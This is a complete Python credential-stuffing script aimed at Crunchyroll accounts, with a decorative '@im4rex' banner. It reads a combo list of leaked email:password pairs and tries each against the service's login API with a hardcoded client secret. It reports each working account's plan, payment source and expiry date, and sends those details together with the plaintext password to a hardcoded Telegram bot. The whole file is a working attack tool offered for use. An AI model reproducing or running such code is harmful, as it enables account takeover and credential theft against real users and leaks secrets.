import requests
import time
from uuid import uuid1
import os
from cfonts import render

G = '\033[2;32m'
R = '\033[1;31m'
O = '\x1b[38;5;208m'

md1 = '\x1b[1;31m' 
md2 = '\x1b[1;32m' 
a6 = '\x1b[38;5;5m'

colors = [
    '\033[91m',  
    '\033[92m', 
    '\033[93m',  
    '\033[94m',  
    '\033[95m',  
    '\033[96m',  
    '\033[97m'   
]

import pyfiglet
from rich.console import Console

console = Console()

def print_red_banner():
    fig = pyfiglet.Figlet(font="poison")
    banner = fig.renderText("R4X")
    
    color = "bold red"

    colored_banner = f"[{color}]{banner}[/]"

    console.clear()
    console.print(colored_banner, justify="center")

print_red_banner()

RESET = '\033[0m'
saffron = '\033[38;5;208m'
white = '\033[97m'
green = '\033[38;5;22m'

pattern = "▰" * 72
colors = [saffron, white, green]
color_length = len(pattern) // len(colors)
rainbow_line = ''.join(
    [colors[i // color_length] + char for i, char in enumerate(pattern)]
)
print(rainbow_line + RESET)


console = Console()
console.print("[bold red]ᴅᴇᴠᴇʟᴏᴘᴇʀ[/bold red] [bold cyan]• ɪᴍ4ʀᴇx[/bold cyan] [bold green]• ᴄʜᴀɴɴᴇʟ[/bold green] [bold yellow]• ʀ4x ᴍᴇᴛʜᴏᴅ[/bold yellow]", justify="center")
RED = '\033[91m'
WHITE = '\033[97m'
RESET = '\033[0m'

RESET = '\033[0m'
saffron = '\033[38;5;208m'
white = '\033[97m'
green = '\033[38;5;22m'

pattern = "▰" * 72
colors = [saffron, white, green]
color_length = len(pattern) // len(colors)
rainbow_line = ''.join(
    [colors[i // color_length] + char for i, char in enumerate(pattern)]
)
print(rainbow_line + RESET)

def login(email,pasw):
	headers = {"ETP-Anonymous-ID": str(uuid1),"Request-Type": "SignIn","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
	data = {"grant_type":"password","username":email,"password":pasw,"scope":"offline_access","client_id":"yhukoj8on9w2pcpgjkn_","client_secret":"q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF","device_type":"FIRETV","device_id":str(uuid1),"device_name":"kara"}
	res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token",data=data,headers=headers)
	token = res.text.split('access_token":"')[1].split('"')[0]

	if "refresh_token" in res.text:
		headers_get = {"Authorization": f"Bearer {token}","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Length":"0","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
		res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",headers=headers_get)
		if "external_id" in res_get.text:
			external_id = res_get.text.split('external_id":"')[1].split('"')[0]
			headers_info = {"Authorization": f"Bearer {token}","Accept": "application/json","Accept-Charset": "UTF-8","User-Agent": "Ktor client","Content-Length":"0","Host": "beta-api.crunchyroll.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
			res_info = requests.get(f"https://beta-api.crunchyroll.com//subs/v1/subscriptions/{external_id}/third_party_products",headers=headers_info)
			if "fan" in res_info.text or "premium" in res_info.text or "no_ads" in res_info.text or 'is_subscribable":false' in res_info.text:
				try:
					type = res_info.text.split('"type":"')[1].split('"')[0]
					free_t = res_info.text.split('"active_free_trial":')[1].split(",")[0]		
					payment = res_info.text.split('"source":"')[1].split('"')[0]
					expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
					msg = f"""					
⋘──────━𓆩 𝗡𝗘𝗪 𝗛𝗜𝗧 𓆪━──────⋙ 

➙𝐄𝐌𝐀𝐈𝐋 ➾ {email}
➙𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 ➾ {pasw}
➙𝐏𝐋𝐀𝐍 ➾ {type}
➙𝐅𝐑𝐄𝐄 𝐓𝐑𝐈𝐀𝐋 ➾ {free_t}
➙𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐌𝐄𝐓𝐇𝐎𝐃 ➾ {payment}
➙𝐄𝐗𝐏𝐈𝐑𝐘 ➾ {expiry}

⋘──────━𓆩 @im4rex 𓆪━──────⋙ 
"""           
					print(f' {G}{msg}')
					requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={msg}')
				except:
					print(f" {G}{email}:{pasw} ⥤ [HIT] ")
					requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={email}:{pasw}')
			else:
				print()
				print(f'{O}{email}:{pasw} ⥤ [CUSTOM] ')
		else:
			print()
			print(f' {R}{email}:{pasw} ⥤ [BAD] ')
	elif '406 Not Acceptable' in res.text:
		print(f" — Wait a 5+ min ")
		time.sleep(420)
	else:
		print()
		print(f' {R}{email}:{pasw} ⥤ [BAD] ')

tok = '7096521801:AAHua0nUQv0OgXvcodPRPOhKSDhBEZAK-mQ'
ID = '6418195079'
print()
file_name = console.input("[bold cyan]ENTER YOUR COMBO LIST ➾ [/bold cyan]")

file = open(file_name).read().splitlines()
print()

for line in file:
	try:
		email,pasw = line.strip().split(':')
		login(email,pasw)
	except:
		continue